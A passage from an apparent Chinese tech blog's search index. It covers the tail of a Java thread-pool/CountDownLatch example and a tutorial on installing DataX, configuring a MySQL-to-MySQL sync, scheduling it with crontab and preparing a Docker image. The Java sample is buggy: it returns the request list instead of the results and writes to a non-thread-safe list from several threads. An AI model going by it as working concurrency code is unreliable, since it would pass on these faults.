class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(MultiThreadUtil.class);<br><br><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title function_">multiThreadDeal</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 请求任务列表</span><br>    List&lt;Integer&gt; reqlist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    reqlist.add(<span class="hljs-number">1</span>);<br>    reqlist.add(<span class="hljs-number">2</span>);<br>    <span class="hljs-comment">// 返回结果列表</span><br>    List&lt;Integer&gt; retlist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>    <span class="hljs-comment">// 初始化线程池</span><br>    <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">execpool</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(reqlist.size());<br>    <span class="hljs-comment">// 初始化计数器</span><br>    <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">latch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(reqlist.size());<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> item : reqlist) &#123;<br>        execpool.submit(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 依次处理任务，并组装结果</span><br>                <span class="hljs-type">int</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> taskDealFunc(item);<br>                retlist.add(data);<br>                LOGGER.info(<span class="hljs-string">&quot;任务&quot;</span>+item+<span class="hljs-string">&quot;已处理完成&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                LOGGER.error(e.getMessage());<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-comment">// 线程结束计数器 - 1</span><br>                latch.countDown();<br>            &#125;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-comment">// 阻塞主方法，直到所有线程执行完，线程计数器为0</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        latch.await();<br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        LOGGER.error(e.getMessage());<br>    &#125;<br><br>    <span class="hljs-comment">// 关闭线程池</span><br>    execpool.shutdown();<br>    <br>    <span class="hljs-comment">//返回汇总结果</span><br>    <span class="hljs-keyword">return</span> reqlist;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 任务处理，可以是sql查询，数值计算等</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">taskDealFunc</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>    <span class="hljs-comment">// sql查询结果</span><br>    <span class="hljs-keyword">return</span> num;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
      <category>多线程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高效数据同步工具DataX的使用</title>
    <link href="/2022/07/29/%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7DataX%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/07/29/%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7DataX%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="一、DataX-简介"><a href="#一、DataX-简介" class="headerlink" title="一、DataX 简介"></a>一、DataX 简介</h1><p>DataX 是阿里云 DataWorks 数据集成 的开源版本，主要就是用于实现数据间的离线同步。 DataX 致力于实现包括关系型数据库（MySQL、Oracle 等）、HDFS、Hive、ODPS、HBase、FTP 等 各种异构数据源（即不同的数据库） 间稳定高效的数据同步功能。<br> <img src="/../blog-assets/%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7DataX%E7%9A%84%E4%BD%BF%E7%94%A8/3aae50a131fc4f4faf6f69f4e185a918.png"> </p><ul><li>为了 <strong>解决异构数据源同步问题，DataX 将复杂的网状同步链路变成了星型数据链路</strong>，DataX 作为中间传输载体负责连接各种数据源；</li><li>当需要接入一个新的数据源时，只需要将此数据源对接到 DataX，便能跟已有的数据源作为无缝数据同步。</li></ul><h2 id="1-DataX-3-0-框架设计"><a href="#1-DataX-3-0-框架设计" class="headerlink" title="1. DataX 3.0 框架设计"></a>1. DataX 3.0 框架设计</h2><p>DataX 采用 Framework + Plugin 架构，将数据源读取和写入抽象称为 Reader&#x2F;Writer 插件，纳入到整个同步框架中。 </p><p> <img src="/../blog-assets/%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7DataX%E7%9A%84%E4%BD%BF%E7%94%A8/3c7df1cbc3f0482baef9fe451ab690fe.png"> </p><table><thead><tr><th>角色</th><th>作用</th></tr></thead><tbody><tr><td>Reader（采集模块）</td><td>负责采集数据源的数据，将数据发送给 <code>Framework</code></td></tr><tr><td>Writer（写入模块）</td><td>负责不断向 <code>Framework</code> 中取数据，并将数据写入到目的端</td></tr><tr><td>Framework（中间商）</td><td>负责连接 <code>Reader</code> 和 <code>Writer</code>，作为两者的数据传输通道，并处理缓冲，流控，并发，数据转换等核心技术问题</td></tr></tbody></table><h2 id="2-DataX-3-0-核心架构"><a href="#2-DataX-3-0-核心架构" class="headerlink" title="2. DataX 3.0 核心架构"></a>2. DataX 3.0 核心架构</h2><p>DataX 完成单个数据同步的作业，我们称为 <code>Job</code>，DataX 接收到一个 <code>Job</code> 后，将启动一个进程来完成整个作业同步过程。<strong>DataX Job 模块是单个作业的中枢管理节点，承担了数据清理、子任务切分、TaskGroup 管理等功能</strong>。 </p><p><img src="/../blog-assets/%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7DataX%E7%9A%84%E4%BD%BF%E7%94%A8/32f6c08c122b42ad82756b3801d498e7.png"> </p><ul><li>DataX Job 启动后，会根据不同源端的切分策略，将 <code>Job</code> 切分成多个小的 <code>Task</code> (子任务)，以便于<strong>并发执行</strong>；</li><li>接着 DataX Job 会调用 <code>Scheduler</code> 模块，根据配置的并发数量，将拆分成的 <code>Task</code> 重新组合，组装成 <code>TaskGroup</code>（任务组）；</li><li>每一个 <code>Task</code> 都由 <code>TaskGroup</code> 负责启动，<code>Task</code> 启动后，会固定启动 <code>Reader --&gt; Channel --&gt; Writer</code> 线程来完成任务同步工作；</li><li>DataX 作业运行启动后，Job 会对 <code>TaskGroup</code> <strong>进行监控操作</strong>，等待所有 TaskGroup 完成后，Job 便会成功退出（<strong>异常退出时 值非 0</strong>）</li></ul><h3 id="DataX-调度过程"><a href="#DataX-调度过程" class="headerlink" title="DataX 调度过程"></a>DataX 调度过程</h3><ul><li>首先 DataX Job 模块会根据分库分表切分成若干个 <code>Task</code>，然后根据用户配置并发数，来计算需要分配多少个 <code>TaskGroup</code>；</li><li>计算过程：<code>Task / Channel = TaskGroup</code>，最后由 <code>TaskGroup</code> 根据分配好的并发数来运行 <code>Task</code>（任务）</li></ul><h1 id="二、使用-DataX-实现数据同步"><a href="#二、使用-DataX-实现数据同步" class="headerlink" title="二、使用 DataX 实现数据同步"></a>二、使用 DataX 实现数据同步</h1><blockquote><p>准备环境：</p><ul><li>JDK（<code>1.8</code> 以上，推荐 1.8）</li><li>Python（<code>2.x</code> 版本，CentOS 7 自带python 2.7，若要使用python3需修改  <code>datax/bin</code> 目录下的三个py文件以符合 python3 语法要求）</li><li>Apache Maven 3.x（Compile DataX）（手动打包使用，使用 <code>tar</code> 包方式不需要安装）</li></ul></blockquote><h2 id="1-Linux-上安装-DataX-软件"><a href="#1-Linux-上安装-DataX-软件" class="headerlink" title="1. Linux 上安装 DataX 软件"></a>1. Linux 上安装 DataX 软件</h2><h3 id="安装-DataX"><a href="#安装-DataX" class="headerlink" title="安装 DataX"></a>安装 DataX</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取datax软件包</span><br>wget http://datax-opensource.oss-cn-hangzhou.aliyuncs.com/datax.tar.gz<br><span class="hljs-comment"># 创建datax目录并解压</span><br><span class="hljs-built_in">mkdir</span> /opt/docker/datax &amp;&amp; <span class="hljs-built_in">mv</span> datax.tar.gz /opt/docker/datax<br><span class="hljs-built_in">cd</span> /opt/docker/datax &amp;&amp; tar zxf datax.tar.gz -C /usr/local/<br><span class="hljs-comment"># 需要删除隐藏文件 (重要)</span><br><span class="hljs-built_in">rm</span> -rf /usr/local/datax/plugin/*/._*<br></code></pre></td></tr></table></figure><h3 id="安装JDK-1-8（已安装可忽略）"><a href="#安装JDK-1-8（已安装可忽略）" class="headerlink" title="安装JDK 1.8（已安装可忽略）"></a>安装JDK 1.8（已安装可忽略）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 需先下载 jdk-8u301-linux-x64.tar.gz 并上传至服务器目录</span><br>[root@VM-12-14-centos datax]<span class="hljs-comment"># ls</span><br>datax.tar.gz  jdk-8u301-linux-x64.tar.gz<br>[root@VM-12-14-centos datax]<span class="hljs-comment"># mv jdk1.8.0_301 /usr/local/java</span><br>[root@VM-12-14-centos datax]<span class="hljs-comment"># cat &lt;&lt;END &gt;&gt; /etc/profile</span><br>&gt; <span class="hljs-built_in">export</span> JAVA_HOME=/usr/local/java<br>&gt; <span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span>/bin<br>&gt; END<br>[root@VM-12-14-centos datax]<span class="hljs-comment"># source /etc/profile</span><br>[root@VM-12-14-centos datax]<span class="hljs-comment"># java -version</span><br></code></pre></td></tr></table></figure><h2 id="2-DataX-基本使用"><a href="#2-DataX-基本使用" class="headerlink" title="2. DataX 基本使用"></a>2. DataX 基本使用</h2><p>查看 DataX 数据同步 <code>json</code> 配置模板及使用说明</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python /usr/local/datax/bin/datax.py -r streamreader -w streamwriter<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs json">DataX (DATAX-OPENSOURCE<span class="hljs-number">-3.0</span>)<span class="hljs-punctuation">,</span> From Alibaba !<br>Copyright (C) <span class="hljs-number">2010</span><span class="hljs-number">-2017</span><span class="hljs-punctuation">,</span> Alibaba Group. All Rights Reserved.<br><br>Please refer to the streamreader document<span class="hljs-punctuation">:</span>     https<span class="hljs-punctuation">:</span><span class="hljs-comment">//github.com/alibaba/DataX/blob/master/streamreader/doc/streamreader.md </span><br><br>Please refer to the streamwriter document<span class="hljs-punctuation">:</span>     https<span class="hljs-punctuation">:</span><span class="hljs-comment">//github.com/alibaba/DataX/blob/master/streamwriter/doc/streamwriter.md </span><br> <br>Please save the following configuration as a json file and  use<br>     python <span class="hljs-punctuation">&#123;</span>DATAX_HOME<span class="hljs-punctuation">&#125;</span>/bin/datax.py <span class="hljs-punctuation">&#123;</span>JSON_FILE_NAME<span class="hljs-punctuation">&#125;</span>.json <br>to run the job.<br><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;job&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;streamreader&quot;</span><span class="hljs-punctuation">,</span> <br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;sliceRecordCount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <br>                <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;streamwriter&quot;</span><span class="hljs-punctuation">,</span> <br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;encoding&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;print&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>        <span class="hljs-attr">&quot;setting&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;speed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;channel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>从上述说明可以看出，使用 DataX 需要两步操作:</p><ul><li>编写同步配置 <code>json</code> </li><li>使用 python 命令执行配置中的 <code>job</code> 任务</li></ul><p>下面将演示同步两个不同 <code>mysql</code> 数据库表的，要实现数据同步，需提前准备：</p><ul><li>数据源数据库</li><li>目标数据库，且已建好需同步的目标表（DataX并不会创建表）</li></ul><h3 id="同步配置样例解析"><a href="#同步配置样例解析" class="headerlink" title="同步配置样例解析"></a>同步配置样例解析</h3><p>这里以同步不同 <code>mysql</code> 数据库举例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;job&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-comment">// 读取端</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;mysqlreader&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-comment">// 源数据库连接用户</span><br>                        <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-comment">// 源数据库连接密码</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-comment">// 需要同步的列 (* 表示所有的列)</span><br>                        <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;connection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-comment">// 源数据库连接</span><br>                                <span class="hljs-attr">&quot;jdbcUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;jdbc:mysql://127.1.2.3:3360/studysource?useUnicode=true&amp;characterEncoding=utf8&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                                <span class="hljs-comment">// 源表</span><br>                                <span class="hljs-attr">&quot;table&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;staff_info&quot;</span><span class="hljs-punctuation">]</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <br>                <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-comment">// 写入端</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;mysqlwriter&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-comment">// 目标数据库连接用户</span><br>                        <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-comment">// 目标数据库连接密码</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;root&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;connection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-comment">// 目标数据库连接</span><br>                                <span class="hljs-attr">&quot;jdbcUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jdbc:mysql://127.2.3.4:3360/studysync?useUnicode=true&amp;characterEncoding=utf8&quot;</span><span class="hljs-punctuation">,</span> <br>                                <span class="hljs-comment">// 目标表</span><br>                                <span class="hljs-attr">&quot;table&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;staff_info&quot;</span><span class="hljs-punctuation">]</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-comment">// 同步前. 要做的事</span><br>                        <span class="hljs-attr">&quot;preSql&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;TRUNCATE TABLE staff_info&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-comment">// 需要同步的列</span><br>                        <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">]</span> <br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>        <span class="hljs-attr">&quot;setting&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;speed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-comment">// 指定并发数</span><br>                <span class="hljs-attr">&quot;channel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;5&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>不同的数据库支持配置会有差异，具体解析可参考官方： <a href="https://github.com/alibaba/DataX">DataX数据源参考指南</a> ，点击对应<code>读</code> 、<code>写</code> 查看对应文档进行配置定制</p><p><img src="/../blog-assets/%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7DataX%E7%9A%84%E4%BD%BF%E7%94%A8/1658911125147.png" alt="1658911125147"></p><h3 id="执行-DataX-同步任务"><a href="#执行-DataX-同步任务" class="headerlink" title="执行 DataX 同步任务"></a>执行 DataX 同步任务</h3><p>配置文件编写好后，在配置文件所在目录下执行以下命令来进行数据同步：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python /usr/local/datax/bin/datax.py user_sync_mysql2mysql.json<br></code></pre></td></tr></table></figure><p><img src="/../blog-assets/%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7DataX%E7%9A%84%E4%BD%BF%E7%94%A8/1658916220732.png" alt="1658916220732"></p><p>【注】：若出现 <code>java.sql.SQLException: Could not retrieve transation read-only status server</code> 错误，至以下目录检查数据库驱动版本与数据库是否一致</p><ul><li><code>/usr/local/datax/plugin/writer/mysqlwriter/libs</code></li></ul><h2 id="3-配合-crontab-实现数据定时同步"><a href="#3-配合-crontab-实现数据定时同步" class="headerlink" title="3. 配合 crontab 实现数据定时同步"></a>3. 配合 crontab 实现数据定时同步</h2><blockquote><p>crontab 用法可参考：<a href="/2022/07/28/Linux%E4%B8%AD%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1crontab">Linux中的定时任务crontab</a></p></blockquote><p>首先需确保 <code>crontab</code> 服务已启动（ <code>running</code> 状态）；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-12-14-centos ~]<span class="hljs-comment"># service crond status</span><br>Redirecting to /bin/systemctl status crond.service<br>● crond.service - Command Scheduler<br>   Loaded: loaded (/usr/lib/systemd/system/crond.service; enabled; vendor preset: enabled)<br>   Active: active (running) since Sun 2022-06-05 20:28:49 CST; 1 months 21 days ago<br> Main PID: 1064 (crond)<br>    Tasks: 1<br>   Memory: 1.2M<br>   CGroup: /system.slice/crond.service<br>           └─1064 /usr/sbin/crond -n<br></code></pre></td></tr></table></figure><p>编写 DataX 数据同步任务执行的 <code>shell</code> 脚本；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim sync_table.sh<br></code></pre></td></tr></table></figure><p>使用 <code>nohup</code> 实现后台运行命令（ <code>nohup</code> 命令用法可参考<a href="/2022/06/18/Shell%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80">Shell脚本基础</a> ），并将任务执行追加输出重定向到指定目录的 <code>log</code> 文件（<code>touch</code> 命令确保<code>log</code> 文件存在）；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>touch /opt/docker/datax/log/staff_info_mysql2mysql.log<br>nohup python /usr/local/datax/bin/datax.py /opt/docker/datax/source_config/staff_info_mysql2mysql.json &gt;&gt; /opt/docker/datax/log/staff_info_mysql2mysql.log 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p><code>shell</code> 写好后，将脚本执行添加至 <code>crontab</code> ；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -e<br></code></pre></td></tr></table></figure><p>进行如下配置，这里实现的是每天早上 <code>06:30</code> 执行一次脚本完成数据同步；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bahs">30 6 * * * /opt/docker/datax/source_config/sync_table.sh<br></code></pre></td></tr></table></figure><p>至此，我们实现了定时数据同步，不仅如此，通过在 <code>shell</code> 脚本中增加同步表的命令我们可以实现在不同时间频度下批量数据同步，例如以下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">30 6 * * * /opt/docker/datax/source_config/sync_table_daily.sh<br>30 4 * * 1 /opt/docker/datax/source_config/sync_table_weekly.sh<br></code></pre></td></tr></table></figure><p>这里我定义了一个每天 <code>06:30</code> 执行的数据同步与一个每周一 <code>04:30</code> 执行的数据同步，<code>sync_table_daily.sh</code> 脚本中也可以包含多张表的 <code>DataX</code> 同步任务。</p><h2 id="4-将-DataX-制作成docker镜像"><a href="#4-将-DataX-制作成docker镜像" class="headerlink" title="4. 将 DataX 制作成docker镜像"></a>4. 将 DataX 制作成docker镜像</h2><blockquote><p>需事先准备一个 <code>python2.7+jdk1.8</code> 的docker基础镜像 </p></blockquote><h3 id="4-1-镜像制作"><a href="#4-1-镜像制作" class="headerlink" title="4.1 镜像制作"></a>4.1 镜像制作</h3><p>这里使用一个 <code>centos7 + jdk1.8</code> 的基础镜像，在此镜像基础上安装 DataX ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 通过镜像启动容器并进入容器, mycentos 为要创建的容器名, ae67f82978bc 为镜像ID</span><br>[root@VM-12-14-centos]<span class="hljs-comment"># docker run -it --name mycentos ae67f82978bc</span><br><span class="hljs-comment"># 进入容器后确认java和python环境</span><br>[root@4696780785e2 /]<span class="hljs-comment"># java -version</span><br>openjdk version <span class="hljs-string">&quot;1.8.0_191&quot;</span><br>OpenJDK Runtime Environment (build 1.8.0_191-b12)<br>OpenJDK 64-Bit Server VM (build 25.191-b12, mixed mode)<br>[root@4696780785e2 /]<span class="hljs-comment"># python</span><br>Python 2.7.5 (default, Oct 30 2018, 23:45:53) 